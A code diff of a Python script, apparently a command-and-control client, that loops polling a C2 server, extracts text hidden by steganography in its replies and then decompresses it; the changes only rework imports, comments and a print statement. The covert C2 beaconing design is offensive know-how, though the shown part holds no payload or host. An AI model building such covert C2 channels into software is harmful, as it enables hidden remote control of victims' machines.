@@ -8,8 +8,8 @@
 import time
 
 #Import custom modules
-import c2
-import stego
+import modules.c2 as c2
+import modules.stego as stego
 
 #Initialize script variables
 waitingForC2 = True
@@ -18,25 +18,26 @@ timeBeforeNextC2Poll = 5
 #Creating an endless loop that
 firstLoopItteration = True
 while waitingForC2:
-    if not firstLoopItteration:
+    if not firstLoopItteration: #<-- If this is not the first itteration in the loop
+        #Anounce sleep
         print("Waiting {0} seconds before next C2 poll".format(timeBeforeNextC2Poll))
         time.sleep(timeBeforeNextC2Poll)
-    else:
+        
+        #Announce new itteration
+        print("New loop itteration")
+    else: #<-- If this is the first itteration
         firstLoopItteration = False
-
-    #New loop itteration
-    print("New loop itteration")
 
     #Check if there is a new C&C message
     print("Contacting C2")
     c2Response = c2.get()
     if not c2Response: #<-- If there is no message from the C&C
-        continue
+        continue #<-- Go to the next loop itteration
 
     #Extract the embedded text from the stego text response
     success, embeddedText = stego.extractEmbeddedTextFromStegoText("aa", "bb")
     if (not embeddedText) or (not success):
-        continue
+        continue #<-- Go to the next loop itteration
 
     #Decompress the embedded text
 
